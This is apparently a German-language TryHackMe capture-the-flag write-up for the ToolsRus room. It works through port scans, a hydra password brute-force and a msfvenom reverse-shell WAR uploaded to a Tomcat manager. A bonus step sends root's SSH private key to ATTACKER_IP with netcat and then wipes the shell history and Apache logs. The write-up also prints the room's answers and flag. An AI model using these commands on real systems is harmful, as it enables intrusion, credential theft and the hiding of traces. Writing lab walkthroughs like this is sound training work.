---
title: "ToolsRus Writeup"
date: 2023-07-12
tags: [writeup, ctf, tryhackme]
description: "Hochladen einer bösartigen WAR-Datei auf einen verwundbaren Tomcat-Manager für eine Reverse-Shell im ToolsRus-Room von TryHackMe, gefolgt von Persistenz über einen SSH-Key."
---

## Setup 

Zuerst müssen wir uns mit dem TryHackMe-VPN-Server verbinden. Mehr Infos dazu gibt es auf der [Access](https://tryhackme.com/access)-Seite.

Ich nutze `openvpn`, um mich mit dem Server zu verbinden. Hier ist der Befehl:

```
$ sudo openvpn --config NovusEdge.ovpn
```

## Reconnaissance
Zeit für ein paar schnelle Port-Scans und Recon (Gott segne die Entwickler von `rustscan`):
```shell-session
$ rustscan -b 4500 -a TARGET_IP -r 1-65535 --ulimit 5000 -t 2000 -- -oN rustscan_port_scan.txt 
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack
80/tcp   open  http    syn-ack
1234/tcp open  hotline syn-ack
8009/tcp open  ajp13   syn-ack


$ rustscan -b 4500 -a TARGET_IP -p 22,80,1234,8009 --ulimit 5000 -t 2000 -- -sV -oN rustscan_service_scan.txt
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
1234/tcp open  http    syn-ack Apache Tomcat/Coyote JSP engine 1.1
8009/tcp open  ajp13   syn-ack Apache Jserv (Protocol v1.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Etwas Directory-Enumeration:
```shell-session
$ gobuster dir -t 64 -u http://TARGET_IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster_common.txt 
$ cat gobuster_common.txt       
/.htaccess            (Status: 403) [Size: 297]
/.htpasswd            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/guidelines           (Status: 301) [Size: 319] [--> http://TARGET_IP/guidelines/]
/index.html           (Status: 200) [Size: 168]
/protected            (Status: 401) [Size: 460]
/server-status        (Status: 403) [Size: 301]
```

 > What directory can you find, that begins with a "g"?
 > 
 > Answer: `guidelines`
 
Wenn wir das Verzeichnis `/guidelines/` aufrufen, sehen wir nur einen Text mit dem Inhalt: `Hey bob, did you update that TomCat server?`. 

> Whose name can you find from this directory?
> 
> Answer: `bob`


Außerdem führt der Aufruf des Verzeichnisses `protected` zu einem Authentifizierungs-Popup...
> What directory has basic authentication?
> 
> Answer: `protected`

Versuchen wir mal, das mit hydra per Brute-Force zu knacken :)
```shell-session
$ hydra -l bob -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-100000.txt -s 80 -f TARGET_IP http-get /protected
...
...
[80][http-get] host: TARGET_IP   login: bob   password: bubbles
```

> What is bob's password to the protected part of the website?
> 
> Answer: `bubbles`

Wenn wir uns auf der `protected`-Seite einloggen, begrüßt uns folgende Seite:
![](/assets/img/writeup_assets/toolsrus/protected_page_moved.png)

Wie wir vorhin durch die Port-Scans herausgefunden haben, läuft auf Port **1234** ein _Apache Tomcat server_. Versuchen wir mal, uns dort im Portal einzuloggen, indem wir `http://TARGET_IP:1234/manager/` aufrufen. Hier erwartet uns eine vertraute Authentifizierungsabfrage. Wenn wir die Zugangsdaten `bob:bubbles` nutzen, bekommen wir Zugriff auf das Server-Panel!

> What other port that serves a webs service is open on the machine?
> 
> Answer: `1234`



Die Versionsnummer des Tomcat-Servers finden wir ganz unten auf der `manager`-Seite...
> Going to the service running on that port, what is the name and version of the software?
> (Answer format: Full_name_of_service/Version)
> 
> Answer: `Apache Tomcat/7.0.88`

Auf der Tomcat-Manager-Seite werden insgesamt 5 Dokumentationsdateien erwähnt, also kein Grund, jetzt schon `nikto` anzuwerfen (außerdem ist das ehrlich gesagt etwas verwirrend zu bedienen):
> How many documentation files did ~~Nikto~~ you identify?
> 
> Answer: `5`


> What is the server version (run the scan against port 80)?
> 
> Answer: `Apache/2.4.18`


> What version of Apache-Coyote is this service using?
> 
> Answer: `1.1`


Mit all diesen Infos zu Versionsnummern und Co. gewappnet, schauen wir mal, welche Exploits wir nutzen können, um Zugriff auf die Zielmaschine zu bekommen:

## Gaining Access
Nun ja... Wenn wir uns an die Anweisungen des Rooms halten, besteht dieser Abschnitt normalerweise aus _2_ Teilen. Da wir aber auf der `manager`-Seite eine Datei deployen können, kommen wir ganz einfach an eine Reverse-Shell (die sich im weiteren Verlauf, wie ihr sehen werdet, als Root-Shell herausstellt!). Fangen wir damit an, eine passende Payload zu generieren:
```shell-session
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war > reverse.war
```

Wir generieren eine `WAR`-Datei als Payload, da wir diese über die `manager`-Seite hochladen können: 
![](/assets/img/writeup_assets/toolsrus/war_file_upload.png)

Sobald die Datei deployed ist, starte einen Listener auf dem angegebenen Port auf deinem Rechner (in diesem Fall 4444), und zwar so:
```shell-session
$ nc -nvlp 4444
```

Wenn wir nun die URL `http://TARGET_IP:1234/reverse/` aufrufen, erhalten wir eine Verbindung auf unserem netcat-Listener und können uns daran machen, die Shell zu stabilisieren:
```shell-session
$ nc -nvlp 4444          
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 44662

python -c "import pty; pty.spawn('/bin/bash')"
root@ip-TARGET_IP:/# ^Z
zsh: suspended  nc -nvlp 4444

$ stty raw -echo && fg
[1]  + continued  nc -nvlp 4444

export TERM=xterm-256-color
root@ip-TARGET_IP:/# whoami
root

root@ip-TARGET_IP:/# ls /root
flag.txt  snap

root@ip-TARGET_IP:/# cat /root/flag.txt 
`ff1fc4a81affcc7688cf89ae7dc6e0e1`
```

***!!BONUSSCHRITT!!***

Auch wenn wir jetzt eine gerootete Reverse-Shell haben, ist es immer noch lästig, die Reverse-Shell immer wieder neu hochzuladen und zu stabilisieren, falls wir die Maschine später noch mal ausnutzen wollen. Holen wir uns also den privaten SSH-Key für Persistenz und räumen die hochgeladene Datei `/reverse.war` wieder auf:
```shell-session

## On our machine:
$ nc -nvlp 8888 > toysrus_id_rsa

## On target machine;
root@ip-TARGET_IP:/# ssh-keygen
## Empty passphrases...
root@ip-TARGET_IP:/# nc ATTACKER_IP 8888 -w 3 < /root/.ssh/id_rsa
```

Nice! Jetzt haben wir dauerhaften Zugriff via `ssh`, räumen wir noch ein paar Sachen auf, bevor wir fertig sind...
```shell-session
root@ip-TARGET_IP:/# echo "" > /root/.bash_history 
root@ip-TARGET_IP:/# rm /usr/local/tomcat7/webapps/reverse.war 
root@ip-TARGET_IP:/# rm -rf /usr/local/tomcat7/webapps/reverse/
root@ip-TARGET_IP:/# rm -rf /usr/local/tomcat7/work/Catalina/localhost/reverse
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/access.log 
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/error.log 
root@ip-TARGET_IP:/# echo "" > /var/log/apache2/other_vhosts_access.log 

## Just for good measure...
root@ip-TARGET_IP:/# echo "" > /root/.bash_history
```

Und fertig!

> What text is in the file `/root/flag.txt`?
> 
> Answer:  `ff1fc4a81affcc7688cf89ae7dc6e0e1`

## Fazit
Wenn dir dieses Writeup geholfen hat, folge mir gerne auf GitHub (https://github.com/NovusEdge) und/oder lass einen Stern beim Repository da: https://github.com/NovusEdge/thm-writeups


- Room: [ToolsRus](https://tryhackme.com/room/toolsrus)
